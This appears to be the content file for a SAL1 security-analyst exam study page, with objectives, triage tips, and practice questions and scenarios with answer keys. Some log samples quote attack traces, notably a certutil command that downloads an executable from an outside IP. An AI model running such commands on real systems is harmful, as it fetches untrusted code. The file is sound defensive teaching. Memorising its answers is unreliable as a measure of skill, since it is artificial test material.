title: SAL1
lead: TryHackMe's Security Analyst Level 1 cert. Most of the score comes from working real alerts in a simulated SOC: you triage them, decide true or false positive, escalate the right ones and write case reports. It proves you can do the Tier 1 analyst job, not just describe it.
mockText: 25 items in 2 hours: 20 multiple-choice questions (200 points) and 5 timed SOC Simulator scenarios (800 points), scored out of 1,000 with a pass mark of 750, like the real exam. It is shorter than the real exam: real SAL1 is 80 multiple-choice questions plus 2 two-hour SOC Simulator scenarios. Every attempt draws different questions and scenarios, so retakes differ.
objSub: Five topic areas from TryHackMe's SAL1 training content. Tick objectives as you study them; progress saves on this device.
planSub: Set how many hours a week you can give it. The plan splits about 80 hours across the five areas (the SOC Level 1 path alone is about 65 hours of labs), then saves the last stretch for SOC Simulator practice.
pbqSub: Hands-on practice in the style of the SOC Simulator, the part of the exam worth 800 of 1,000 points.

cur.label: Current exam
cur.note: One exam, three parts, in order: 80 multiple-choice questions in 1 hour (200 points), then two SOC Simulator scenarios of 2 hours each (400 points each). All of it has to be done inside a 24-hour window that starts when you begin.
cur.onote: TryHackMe lists these five areas without weights. The bars are a suggested study share, tilted toward areas 3 to 5 because the SOC Simulator (80% of the score) leans on them.

domains.name: Fundamental Knowledge
obj: Network essentials
TCP/IP, common ports, DNS, HTTP and how normal traffic looks, so the strange traffic stands out.
Operating system basics
Windows and Linux processes, services, users, file systems and where each one keeps its logs.
Cryptography basics
Hashing versus encryption, certificates and TLS, and why encoded (Base64) is not encrypted.
Cloud and virtualisation basics
Virtual machines, containers and cloud accounts, and how they show up in your alerts.
Web and scripting basics
HTTP requests and responses, HTML and JavaScript, and reading PowerShell, Bash and Python well enough to tell what a script does.

domains.name: Cybersecurity Frameworks
obj: Cybersecurity fundamentals
The CIA triad, defense in depth, least privilege and the blue team's role.
MITRE ATT&CK
Tactics (the why), techniques and sub-techniques (the how), and mapping an alert to them.
Cyber Kill Chain
Recon, weaponization, delivery, exploitation, installation, command and control, actions on objectives.
NIST Cybersecurity Framework
Govern, Identify, Protect, Detect, Respond and Recover, and where a SOC sits in it.
Attack traces and indicators
IOCs (hashes, IPs, domains) versus behaviors, and the Pyramid of Pain.

domains.name: Common Malicious Behaviour
obj: Social engineering
Phishing, spoofed senders, lookalike domains and credential-harvesting pages. Read headers: SPF, DKIM, DMARC, Reply-To.
Network attacks
Port scans, brute force and password spraying, man-in-the-middle and data exfiltration.
Web exploitation
SQL injection, XSS, path traversal, file upload abuse and web shells, as they look in web server logs.
Endpoint attacks
Malicious macros, credential dumping, persistence through scheduled tasks, services and Run keys.
Command and control
Beaconing, DNS tunneling and traffic to new or rare domains.
Malware and LOLBAS
Malware types, and attackers living off the land with built-in tools like PowerShell, certutil and rundll32.

domains.name: Security Tools of the Trade
obj: Endpoint detection and response (EDR)
Process trees, isolating a host, and reading what ran, from where and by whom.
Network and web protection
Firewalls, IDS/IPS (Snort rules), proxies and web application firewalls.
Security information and event management (SIEM)
Searching logs in Splunk (SPL) and Elastic (KQL), building timelines and pivoting between fields.
Security orchestration and automation (SOAR)
Playbooks that enrich and respond automatically, and what still needs a human.
Threat intelligence platforms
Checking hashes, IPs and domains against threat intel (VirusTotal, AbuseIPDB and similar).
Vulnerability scanning
What scanners find, and why a scanner can set off alerts of its own.

domains.name: SOC Workflows and Activities
obj: SOC team and responsibilities
L1, L2 and L3 roles, and what Tier 1 owns: the alert queue.
Common security activities
Monitoring, triage, phishing review, threat hunting support and reporting.
Alert triage and ticketing
Classify true or false positive, set severity, document evidence and close or hand off.
SOC metrics and lookups
MTTD, MTTA, MTTR, false positive rate, and lookup tables and workbooks that speed up triage.
Escalation and communication
When and how to escalate, what to put in the ticket, and writing a clear case report.

extras.title: Triage one alert
rows: Read the alert: rule name, host, user, time and severity.
Get context: who is the user, what is the host, is this normal for them?
Investigate in the SIEM and EDR: what happened before and after?
Check every IOC (hash, IP, domain) against threat intel.
Decide: true positive or false positive, with the evidence that proves it.
Escalate true positives that need action; close the rest with notes.
Write the case report: who, what, when, where, why and how.

extras.title: Windows events every L1 knows
rows: Logon type 2 is at the keyboard, 3 is over the network, 10 is RDP.
Many in a row from one source is brute force; one password across many users is spraying.
Needs command-line logging turned on to show the full command.
A new account outside a change ticket is a red flag.
A common way attackers survive a reboot.
Another persistence trick, and how PsExec shows up.
Almost never normal. Someone may be hiding tracks.
Parent and child process plus full command line and hashes.
Which process talked to which IP and port.

extras.title: Pyramid of Pain
extras.sub: 2.0 · how much it hurts the attacker
rows: Change one byte and the hash is new.
Registry keys, file paths, user agents.
They have to find or build new tools.
They have to change how they work. Detect these.

extras.title: SOC metrics
extras.sub: 5.0 · what your team is measured on
rows: Alert fires to an analyst picks it up.
Alert to the threat being contained.
Share of alerts that weren't real. High means rules need tuning.

method: Use the five areas above as your checklist. Areas 3 to 5 carry the simulator, and the simulator carries 80% of the score.
Work through TryHackMe's Cyber Security 101 path, then the SOC Level 1 path (14 modules, about 65 hours of labs).
Run the SOC Simulator scenarios again and again until triage, escalation and the case report feel routine.
Flashcards for event IDs, ports, ATT&CK tactics, kill chain phases and phishing header fields.
Time yourself: 80 questions in 60 minutes, then a 2-hour simulator run with the report written before the clock ends.
tips: Close every alert you've worked before each 2-hour clock runs out. Alerts left open when time expires don't score.
Case reports are worth 100 of the 400 points in each scenario. Use who, what, when, where, why and how every time.
Escalate true positives that need action. Escalating everything costs points like missing things does.
80 questions in 60 minutes is 45 seconds each. Don't get stuck; it's only 200 of the 1,000 points.
It isn't proctored and you can break between parts, but the window runs nonstop once you start.

quiz.q: A firewall alert shows HR-PC12 making an outbound TCP connection to 203.0.113.50 on port 3389. The user works in HR and has no IT duties. What is this traffic MOST likely, and why does it matter?
o: RDP to a host on the internet. Users don't normally RDP out, so it may be a tunnel or data leaving
Right. 3389 is RDP. An HR workstation opening RDP to an outside address isn't normal and is worth investigating.
SSH to a cloud server, which is normal admin work
SSH is port 22, and an HR user has no admin work to do.
HTTPS web browsing, which is normal
HTTPS is port 443. Port 3389 is RDP.
SMB file sharing with a partner
SMB is port 445, and SMB to the internet would be its own red flag.

quiz.q: A process command line contains -enc JABjAGwAaQBlAG4AdAA9AA... What should you do FIRST to understand it?
o: Base64-decode it (it's UTF-16LE) to read the PowerShell it runs
Right. -enc takes Base64-encoded PowerShell. Encoding hides it from a quick look but doesn't protect it. Decode it, for example in CyberChef.
Try to crack it with hashcat
It isn't a hash. Base64 is an encoding and reverses instantly.
Ask the user for the decryption key
There is no key. Base64 is encoding, not encryption.
Close it: encoded commands are always admin scripts
Attackers use -enc all the time to hide commands. You have to read it before you close anything.

quiz.q: Your team keeps blocking a phishing kit's IP addresses, and the attacker keeps coming back from new ones. On the Pyramid of Pain, what kind of detection would hurt the attacker MOST?
o: One based on their TTPs, such as Office apps spawning PowerShell
Right. TTPs sit at the top of the pyramid. Changing how they operate costs the attacker much more than buying a new IP.
Blocking the file hashes of their attachments
Hashes are at the bottom: change one byte and the hash is new.
Blocking their domain names
Domains are cheap and easy to replace, just a step above IPs.
Blocking more IP addresses faster
IPs are near the bottom. The attacker swaps them faster than you can block them.

quiz.q: A user opened a macro document. The macro downloaded a DLL, and the DLL created a scheduled task that runs it at every logon. Which Cyber Kill Chain phase does the scheduled task represent?
o: Installation
Right. Installation is the attacker setting up a foothold that survives, like a scheduled task (persistence).
Delivery
Delivery was the email that brought the document.
Exploitation
Exploitation was the macro running code when the document opened.
Actions on objectives
That's the end goal, like stealing or encrypting data. Nothing like that has happened yet.

quiz.q: An alert maps to MITRE ATT&CK T1059.001. What does that ID tell you?
o: A sub-technique (PowerShell) of Command and Scripting Interpreter, under the Execution tactic
Right. T1059 is the technique, .001 is the PowerShell sub-technique, and it sits under the Execution tactic (the attacker's goal: run code).
A CVE for a PowerShell vulnerability
CVEs look like CVE-2024-12345. ATT&CK IDs describe behavior, not bugs.
A Windows event ID for script logging
PowerShell script block logging is event 4104. T1059.001 is an ATT&CK ID.
A tactic, the attacker's goal
Tactics have TA IDs, like TA0002 for Execution. T IDs are techniques.

quiz.q: A reported email shows From: Payroll <payroll@acme.example> and Authentication-Results: spf=fail; dkim=none; dmarc=fail. The Reply-To is acme-payroll@freemail.example. What is the BEST conclusion?
o: The sender is spoofed: acme.example's servers didn't send it, and replies go to the attacker
Right. SPF and DMARC failing means the message didn't come from a server allowed to send for acme.example. The outside Reply-To catches the victim's answer.
It's real, because the From address is the company's own
The From field is easy to fake. The authentication results show it wasn't sent by acme.example.
It's real but misconfigured; tell payroll to fix SPF
Possible in theory, but the outside Reply-To makes this a classic spoof.
DKIM none proves it was sent internally
DKIM none only means there was no signature. It proves nothing about where it came from.

quiz.q: Sysmon shows certutil.exe -urlcache -split -f http://198.51.100.9/u.exe C:\Users\Public\u.exe on a finance laptop. What is this?
o: A built-in Windows tool abused to download a file (living off the land)
Right. certutil is meant for certificates, but attackers use it as a downloader. LOLBAS lists it. Check the file's hash and what ran next.
Windows Update fetching a patch
Windows Update doesn't use certutil, and it doesn't drop .exe files in C:\Users\Public.
A certificate renewal
Renewals don't download executables from a bare IP address.
Normal, because certutil is signed by Microsoft
Signed tools get abused because they're trusted. Who signed it doesn't tell you what it was used for.

quiz.q: Proxy logs show WS-31 contacting cdn-upd8.example every 60 seconds, around the clock, sending about 300 bytes each time. The domain was registered 4 days ago. What is this MOST likely?
o: Command and control beaconing
Right. Regular timing, tiny payloads, a brand-new domain and traffic at all hours all point to malware checking in with its server.
Normal software update checks
Update checks don't usually run every minute, and they go to vendor domains that are years old.
Data exfiltration in progress
300 bytes a minute is too little to be moving data out. It looks like check-ins.
A user browsing a news site
People don't browse at exact 60-second intervals all night.

quiz.q: You've confirmed ransomware is starting to encrypt files on FIN-LT07. Which tool lets you cut that laptop off from the network fastest, while keeping it running for investigation?
o: EDR, using its host isolation feature
Right. EDR can isolate a host in one click: it blocks network traffic except to the EDR console, so the laptop stays on for evidence.
The SIEM
The SIEM collects and searches logs. It can't contain a host on its own.
A vulnerability scanner
Scanners find weaknesses. They don't respond to incidents.
Threat intelligence platform
Threat intel tells you about indicators. It can't isolate anything.

quiz.q: In Splunk, which search counts failed Windows logons by source IP, highest first?
o: index=wineventlog EventCode=4625 | stats count by src_ip | sort -count
Right. 4625 is a failed logon, stats count by src_ip groups them, and sort -count puts the noisiest source first.
index=wineventlog EventCode=4624 | stats count by src_ip | sort -count
4624 is a successful logon, not a failed one.
index=wineventlog EventCode=4625 | table src_ip | sort count
table lists rows without counting them, and sort count sorts lowest first.
index=wineventlog EventCode=4625 | dedup src_ip
dedup keeps one row per IP. It throws away the count you need.

quiz.q: You've confirmed a true positive: mimikatz ran on a file server, and the playbook says credential theft goes to L2. What is your BEST next step as L1?
o: Escalate to L2 now with the evidence: host, user, time, command line, hash and your findings
Right. L1 confirms and hands off quickly with everything L2 needs, so nobody has to redo your work.
Reimage the server yourself to stop the attack
That destroys evidence and isn't L1's call. Follow the playbook.
Close it, since the antivirus already quarantined the file
Mimikatz running means credentials may already be stolen. Quarantine doesn't undo that.
Wait to see if the attacker does anything else
Waiting gives the attacker time to use the stolen credentials.

quiz.q: Your SOC lead says alerts sit in the queue for an average of 42 minutes before an analyst picks them up. Which metric is that?
o: Mean time to acknowledge (MTTA)
Right. MTTA measures from the alert firing to an analyst taking it.
Mean time to detect (MTTD)
MTTD is from when the attack starts to when the alert fires.
Mean time to respond (MTTR)
MTTR runs from the alert to containment, which takes longer than just picking it up.
False positive rate
That's the share of alerts that weren't real, not a time.

pbqs.title: Triage the alert queue
pbqs.scenario: You're the L1 analyst on shift. For each alert, pick the verdict and the right next step. Steps can repeat.

rows.req: WINWORD.EXE on HR-PC07 started powershell.exe -nop -w hidden -enc ..., which then connected to a domain registered yesterday.
rows.why: Word starting hidden, encoded PowerShell that calls a brand-new domain is a classic malicious macro. It's real and needs response, so escalate with the evidence.

rows.req: Impossible travel: jlee logged in from Virginia, then from Frankfurt 5 minutes later. The Frankfurt IP is the company's own VPN exit, and jlee was on VPN.
rows.why: The 'travel' is the VPN. Document why it's benign and close it.

rows.req: Possible data exfiltration: 40 GB from BACKUP-01 to the backup vendor's known IP at 01:00. It has fired at 01:00 every night for six months.
rows.why: It's the approved backup, and it fires every night. Close it and ask for a tuning change that excludes this known flow, so the queue stops filling with it.

rows.req: certutil.exe on FIN-LT03 downloaded payload.exe to C:\Users\Public. Its hash is flagged by 12 antivirus engines.
rows.why: A built-in tool abused to download a known-bad file. Escalate so the host is contained and the payload is investigated.

rows.req: A user reported a phishing email with a credential page. Mail logs show nobody clicked, and the email gateway already pulled the message from every inbox.
rows.why: The phishing was real (true positive), but it's contained and nobody clicked. Record the IOCs and close it. Nothing is left for L2.

pbqs.title: Name what the log shows
pbqs.scenario: Each snippet comes from your SIEM. Pick what it shows. Each answer is used once; two choices are distractors.

items.log:
38 x EventCode=4625  user=jsmith  src=185.220.101.4  (02:11:05 to 02:12:40)
1 x  EventCode=4624  user=jsmith  src=185.220.101.4  LogonType=10
items.why: Dozens of failures for one account from one outside IP, then a successful RDP logon (type 10). The guessing worked: escalate and reset the account.

items.log:
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...
items.why: Word starting hidden PowerShell with an encoded command is the classic macro attack. Decode the Base64 to see what it does.
A .php file in the uploads folder taking commands in a cmd parameter is a web shell. Someone uploaded code and is now running commands on the server.

items.log:
WS-18 TXT? aGVsbG8gd29ybGQ.x7k.example
WS-18 TXT? dGhpcyBpcyBkYXRh.x7k.example
WS-18 TXT? c2VjcmV0cyBoZXJl.x7k.example  (900 queries in 10 min)
items.why: Hundreds of TXT lookups with long, random-looking subdomains of one domain means data is being carried inside DNS queries.

items.log:
EventCode=4698  A scheduled task was created
Task Name: \Microsoft\Windows\Update\Updater
Action: C:\Users\Public\svc.exe   Trigger: At logon
items.why: A task disguised as an update that runs a file from C:\Users\Public at every logon. That's persistence.

items.log:
src=10.0.4.22 dst=198.51.100.7:443 bytes_out=2.1 GB time=02:13
(30-day average for 10.0.4.22: under 50 MB a day)
items.why: A huge outbound transfer at 2 AM from a host that normally sends almost nothing points to data leaving the network.

keep.text: TryHackMe certs are valid for 3 years from the day you start the exam. Today you renew by passing the exam again.
keep.after: TryHackMe says renewal through a more advanced cert or related rooms is coming.

keep.text: SAL1 isn't on the DoD 8140 qualification matrix (V3.0). On its own it won't qualify you for a coded billet.
keep.after: Pair it with Security+ or CySA+, which are on the matrix, for analyst work roles like Cyber Defense Analyst (511).

keep.text: It proves you can triage a queue, which is exactly what Tier 1 interviews test. Add the badge to your résumé and LinkedIn with the verify link.
keep.after: In a Coast Guard SOC or a contractor interview, walk through one simulator case: alert, evidence, verdict, escalation.
